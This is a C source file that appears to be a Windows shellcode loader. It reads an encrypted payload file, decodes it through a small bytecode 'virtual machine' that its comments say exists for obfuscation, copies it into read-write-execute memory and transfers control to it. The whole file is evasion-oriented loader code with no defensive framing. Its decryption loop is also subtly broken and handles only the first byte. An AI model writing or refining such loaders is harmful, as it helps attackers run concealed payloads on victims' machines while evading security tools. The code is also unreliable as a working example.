#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>

// Virtual Machine Opcodes
#define OPCODE_ROTATE 0x01  // Opcode for rotation (decryption)
#define OPCODE_EXECUTE 0x02 // Opcode for execution

// Function prototypes
// File reading functions are split into two parts for modularity
void read_file_part1(const char *filename, FILE **file);
void read_file_part2(FILE *file, unsigned char **shellcode, long *file_size);

// Shellcode decryption split into two parts for better separation
void decrypt_shellcode_vm_part1(unsigned char *shellcode, long size, int rotation_value);
void decrypt_shellcode_vm_part2(unsigned char *bytecode, unsigned char *shellcode, long size);

// Shellcode execution split into two parts for modularity and obfuscation
void execute_shellcode_vm_part1(void *exec, unsigned char *shellcode, long size);
void execute_shellcode_vm_part2(unsigned char *bytecode, void *exec);

// Virtual Machine interpreter split into two parts for opcode handling
void vm_interpreter_part1(unsigned char *bytecode, unsigned char **shellcode, long *pc);
void vm_interpreter_part2(unsigned char *bytecode, long *pc, unsigned char *shellcode, void *exec);

int main() {
    const char *filename = "encrypted.bin"; // Input file containing encrypted shellcode
    unsigned char *shellcode = NULL;       // Pointer to store shellcode
    long file_size = 0;                    // Size of the shellcode file

    // File reading split into two parts
    FILE *file = NULL;
    read_file_part1(filename, &file);      // Open the file
    if (file == NULL) return 1;            // Exit if file could not be opened

    read_file_part2(file, &shellcode, &file_size); // Read the file into memory
    if (!shellcode) return 1;             // Exit if shellcode could not be read

    // Allocate memory for the final executable shellcode
    void *exec = VirtualAlloc(NULL, file_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {                    // Exit if memory allocation fails
        fprintf(stderr, "Error: VirtualAlloc failed!\n");
        free(shellcode);                   // Free allocated memory
        return 1;
    }

    // Decrypt and execute shellcode
    decrypt_shellcode_vm_part1(shellcode, file_size, 33); // Decrypt the shellcode
    execute_shellcode_vm_part1(exec, shellcode, file_size); // Execute the shellcode

    // Cleanup allocated memory
    free(shellcode);
    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}

// File reading, split into two parts
// Part 1: Open the file and handle errors
void read_file_part1(const char *filename, FILE **file) {
    *file = fopen(filename, "rb"); // Open the file in binary mode
    if (*file == NULL) {
        perror("Error opening file"); // Print error message if opening fails
    }
}

// Part 2: Read the file content into memory and handle errors
void read_file_part2(FILE *file, unsigned char **shellcode, long *file_size) {
    fseek(file, 0, SEEK_END);       // Move file pointer to the end to get file size
    *file_size = ftell(file);       // Store the file size
    fseek(file, 0, SEEK_SET);       // Reset file pointer to the start

    if (*file_size <= 0) {          // Check for invalid file size
        fprintf(stderr, "Error: File size is invalid!\n");
        fclose(file);               // Close the file
        return;
    }

    // Allocate memory for the shellcode
    *shellcode = (unsigned char *)malloc(*file_size);
    if (*shellcode == NULL) {       // Handle memory allocation failure
        fprintf(stderr, "Error: Memory allocation failed!\n");
        fclose(file);
        return;
    }

    // Read the file content into the allocated memory
    if (fread(*shellcode, 1, *file_size, file) != *file_size) {
        fprintf(stderr, "Error: File read failed!\n");
        free(*shellcode);           // Free allocated memory
        *shellcode = NULL;
    }
    fclose(file);                   // Close the file
}

// Decryption, split into two parts
// Part 1: Generate bytecode for the decryption operation
void decrypt_shellcode_vm_part1(unsigned char *shellcode, long size, int rotation_value) {
    unsigned char *bytecode = (unsigned char *)malloc(size * 2); // Allocate memory for bytecode
    for (long i = 0; i < size; i++) {        // Generate decryption bytecode
        bytecode[i * 2] = OPCODE_ROTATE;    // Set opcode for rotation
        bytecode[i * 2 + 1] = (unsigned char)rotation_value; // Set rotation value
    }
    decrypt_shellcode_vm_part2(bytecode, shellcode, size); // Execute decryption bytecode
    free(bytecode);                 // Free allocated bytecode memory
}

// Part 2: Execute decryption bytecode using the VM
void decrypt_shellcode_vm_part2(unsigned char *bytecode, unsigned char *shellcode, long size) {
    printf("Decrypting shellcode with VM...\n");
    long pc = 0;                    // Initialize program counter
    vm_interpreter_part1(bytecode, &shellcode, &pc); // Use VM to decrypt shellcode
    printf("Decryption complete.\n");
}

// Execution, split into two parts
// Part 1: Prepare for execution and generate execution bytecode
void execute_shellcode_vm_part1(void *exec, unsigned char *shellcode, long size) {
    memcpy(exec, shellcode, size);  // Copy shellcode to executable memory
    unsigned char bytecode[] = {OPCODE_EXECUTE}; // Generate execution bytecode
    execute_shellcode_vm_part2(bytecode, exec); // Execute bytecode
}

// Part 2: Execute the bytecode to run the shellcode
void execute_shellcode_vm_part2(unsigned char *bytecode, void *exec) {
    printf("Executing shellcode with VM...\n");
    long pc = 0;                    // Initialize program counter
    vm_interpreter_part2(bytecode, &pc, NULL, exec); // Use VM to execute shellcode
}

// Virtual Machine, split into two parts
// Part 1: Handle decryption (OPCODE_ROTATE) instructions
void vm_interpreter_part1(unsigned char *bytecode, unsigned char **shellcode, long *pc) {
    while (*pc < 2) {               // Process bytecode instructions
        unsigned char opcode = bytecode[(*pc)++]; // Fetch the opcode
        if (opcode == OPCODE_ROTATE) { // Handle rotation opcode
            int rotation = (int)bytecode[(*pc)++]; // Fetch rotation value
            **shellcode = (**shellcode - rotation + 256) % 256; // Perform rotation
            (*shellcode)++;         // Move to the next byte
        }
    }
}

// Part 2: Handle execution (OPCODE_EXECUTE) instructions
void vm_interpreter_part2(unsigned char *bytecode, long *pc, unsigned char *shellcode, void *exec) {
    while (*pc < 1) {               // Process bytecode instructions
        unsigned char opcode = bytecode[(*pc)++]; // Fetch the opcode
        if (opcode == OPCODE_EXECUTE) { // Handle execution opcode
            if (exec) {
                printf("VM: Transferring control to shellcode...\n");
                ((void (*)())exec)(); // Execute the shellcode
            }
            return;               
        }
    }
}
